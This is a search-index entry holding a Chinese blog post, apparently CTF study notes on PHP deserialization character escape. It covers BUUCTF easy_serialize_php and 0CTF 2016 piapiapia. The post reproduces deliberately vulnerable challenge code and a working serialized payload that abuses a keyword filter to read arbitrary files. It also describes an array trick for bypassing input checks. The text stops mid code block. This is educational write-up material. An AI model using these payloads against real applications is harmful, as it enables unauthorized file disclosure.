<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>反序列化漏洞学习笔记（二）—— 反序列化字符逃逸</title>
    <url>/2021/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="0x00-PHP反序列化的特性"><a href="#0x00-PHP反序列化的特性" class="headerlink" title="0x00 PHP反序列化的特性"></a>0x00 PHP反序列化的特性</h2><p>PHP反序列化字符逃逸依靠PHP在反序列化时的几个特性：</p>
<blockquote>
<ul>
<li><p>对类中不存在的属性也会反序列化</p>
</li>
<li><p>在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且根据长度判断内容</p>
<p>例：正常的反序列化可执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></p>
<p>执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;</code>仍可得到相同结果</p>
</li>
</ul>
</blockquote>
<h2 id="0x01-BUUCTF-安洵杯-2019-easy-serialize-php"><a href="#0x01-BUUCTF-安洵杯-2019-easy-serialize-php" class="headerlink" title="0x01 BUUCTF-[安洵杯 2019]easy_serialize_php"></a>0x01 BUUCTF-[安洵杯 2019]easy_serialize_php</h2><h3 id="1-1-源码分析"><a href="#1-1-源码分析" class="headerlink" title="1.1 源码分析"></a>1.1 源码分析</h3><p>首先查看给出的PHP源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php4'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>按顺序分析其中重要的代码功能：</p>
<ol>
<li><p>传入的<code>GET</code>参数<code>f</code>被赋给了变量<code>$function</code>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> </code></pre>
</li>
<li><p>将<code>POST</code>的数据导出为变量：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>判断<code>GET</code>是否存在<code>img_path</code>参数，并进行初始化：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li><p>对_SESSION[]进行序列化，并使用filter函数对其中的字符进行过滤：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//把img中的敏感字符替换为空</span>
<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php4'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>根据<code>$function</code>变量判断执行的命令，当<code>$function</code>值为<code>&#39;phpinfo&#39;</code>时可以执行phpinfo()，当值为<code>&#39;show_image&#39;</code>时会对<code>$serialize_info</code>执行反序列化操作：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

</li>
</ol>
<h3 id="1-2-解法分析"><a href="#1-2-解法分析" class="headerlink" title="1.2 解法分析"></a>1.2 解法分析</h3><p>根据上文的分析，初步猜测解法为：</p>
<blockquote>
<ol>
<li><code>GET</code>参数<code>f</code>设置为<code>&#39;show_image&#39;</code></li>
<li>通过<code>extract()</code>函数和<code>POST</code>添加变量或将某些变量覆盖</li>
<li>序列化<code>$serialize_info</code>时，<code>img</code>参数需要自定义</li>
<li>通过<code>file_get_contents()</code>函数读取指定的文件</li>
</ol>
</blockquote>
<h3 id="1-3-解题过程"><a href="#1-3-解题过程" class="headerlink" title="1.3 解题过程"></a>1.3 解题过程</h3><p>先将<code>GET</code>参数<code>f</code>的值设为<code>&#39;phpinfo&#39;</code>，可以看到执行了：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512193352.png" alt="image-20210512193345257" loading="lazy"></p>
<p>一开始，我忽略了边上的注释<code>//maybe you can find something in here!</code>，还以为需要将<code>img</code>的值设为某些名字和<code>flag</code>有关的文件，结果在<code>phpinfo</code>里面找到了：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512193801.png" alt="image-20210512193801686" loading="lazy"></p>
<p>接下来应该就是把<code>&#39;d0g3_f1ag.php&#39;</code>给<code>base64</code>编码后放到<code>img</code>参数里面了</p>
<p>但是，有个大问题：通过<code>extract()</code>函数定义的<code>img</code>参数会被后面的代码初始化，所以不能通过<code>POST</code>上传自定义的<code>img</code>参数</p>
<p>因此，要解这道题需要用到<code>PHP</code>反序列化的一些特点：</p>
<p>例如序列化之后的某一字符串：</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Hed9eh0g"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"aaaaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>PHP在反序列化的时候严格按照这个格式执行，严格按照s的长度取属性的值，多余的部分将会被丢弃</p>
<p>这也就意味着假设<code>&quot;Hed9eh0g&quot;</code>被删掉了部分，反序列化的过程中仍然会寻找引号后长度为8的字符串，只有长度不够，或长度到达指定的8后没有结束的<code>&quot;;</code>标志时，反序列化才无法执行成功</p>
<p>因此，我们可以利用刚刚被我们忽略的<code>filter()</code>函数：通过该函数删掉部分内容，然后把原有的<code>img</code>参数挤到反序列化有效区外，并在有效区内重新构造<code>img</code>参数，<code>exp</code>如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">_SESSION</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'show_image'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$phpphpphp</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'x";s:4:"haha";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
    <span class="token comment">//img为d0g3_f1ag.php的base64编码</span>
    <span class="token keyword">public</span> <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'hahahaha'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">_SESSION</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token comment">//输出结果：</span>
<span class="token comment">//O:8:"_SESSION":4:&#123;s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:9:"phpphpphp";s:53:"x";s:4:"haha";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:8:"hahahaha";&#125;</span>
<span class="token comment">//这里php会被filter函数替换为空，从而使得自定义的img参数生效</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>payload1</code>为：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512201220.png" alt="image-20210512201220932" loading="lazy"></p>
<p>返回结果为：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512201248.png" alt="image-20210512201248241" loading="lazy"></p>
<p>以为能直接访问到<code>flag</code>，结果要再来一次，读取这个文件</p>
<p><code>payload2</code>如下：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512201416.png" alt="image-20210512201416432" loading="lazy"></p>
<p>得到<code>flag</code>：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210512201513.png" alt="image-20210512201513080" loading="lazy"></p>
<h2 id="0x02-BUUCTF-0CTF-2016-piapiapia"><a href="#0x02-BUUCTF-0CTF-2016-piapiapia" class="headerlink" title="0x02 BUUCTF-[0CTF 2016]piapiapia"></a>0x02 BUUCTF-[0CTF 2016]piapiapia</h2><h3 id="1-1-题目分析"><a href="#1-1-题目分析" class="headerlink" title="1.1 题目分析"></a>1.1 题目分析</h3><p>我是看着标签点的这题，进去一看差点以为是注入：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210517160111.png" alt="image-20210517160111128" loading="lazy"></p>
<p>尝试了一下没有思路后，我就认怂了，结果题解说扫目录可以发现该题的源码<code>www.zip</code>，但是该题网页访问过快会返回<code>429</code>状态码，所以拿御剑扫不出来，不过题解说可以用<code>dirsearch</code>扫出来</p>
<h3 id="1-2-源码分析"><a href="#1-2-源码分析" class="headerlink" title="1.2 源码分析"></a>1.2 源码分析</h3><p>拿到源码之后就可以开始审计了，首先我在<code>profile.php</code>中发现了<code>unserialize()</code>，且被反序列化的参数<code>$profile</code>来源于<code>$user</code>对象的<code>show_profile()</code>方法，并且，最重要的是：**<code>$profile[&#39;photo&#39;]</code>被<code>file_get_contents</code>取了出来，这也意味着若我们能控制<code>photo</code>的值，便可以得到任意文件**，而恰恰在在<code>config.php</code>中，定义了<code>$flag</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//profile.php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>跟踪该方法可以发现该方法的作用是从数据库中取出<code>$user</code>相应的信息，这也意味着我们可以将某些攻击语句放入数据库然后反序列化，在<code>class.php</code>中，发现在从数据库取出数据后还进行了过滤：将<code>string</code>中的<code>&#39;</code>、<code>\\</code>替换为<code>_</code>，将<code>select</code>等替换为<code>hacker</code>，这也就有了反序列化字符逃逸的机会，在<code>where</code>被替换为<code>hacker</code>时，会多出一个字符，给了我们自定义反序列化结果的机会</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'insert'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>再来看看<code>update.php</code>，这是我们上传数据的位置，但是，我们能上传的四个点均遭到了过滤：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\d&#123;11&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1000000</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>不过，这里有一个<code>PHP</code>知识点：可以用数组绕过<code>strlen</code>和<code>preg_match</code>：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">null</span>
<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">null</span>    
<span class="token function">ereg</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">null</span>
